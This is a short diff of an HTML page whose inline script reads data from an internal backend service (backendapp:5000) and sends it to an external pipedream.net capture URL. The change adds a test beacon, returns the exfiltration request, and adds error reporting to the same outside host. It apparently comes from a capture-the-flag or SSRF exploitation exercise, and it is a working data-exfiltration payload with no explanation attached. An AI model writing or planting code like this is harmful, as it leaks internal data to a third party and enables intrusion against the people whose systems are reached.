@@ -9,18 +9,25 @@
 
 <body>
     <script>
+        fetch(`https://eou8sltfe2g1usx.m.pipedream.net?data=asdfasdfasdf`, {
+            method: "GET",
+            mode: "no-cors",
+        })
         fetch(`http://backendapp:5000/product/1/data`, {
             method: "GET",
             mode: "no-cors",
         }).then((data) => {
             return data.text()
         }).then((data) => {
-            fetch(`https://eou8sltfe2g1usx.m.pipedream.net?data=${data}`, {
+            return fetch(`https://eou8sltfe2g1usx.m.pipedream.net?data=${data}`, {
                 method: "GET",
                 mode: "no-cors",
             })
-        }).then(() => {
-            window.location.replace("/")
+        }).catch((e) => {
+            fetch(`https://eou8sltfe2g1usx.m.pipedream.net?data=${e.message}`, {
+                method: "GET",
+                mode: "no-cors",
+            })
         })
     </script>
 </body>
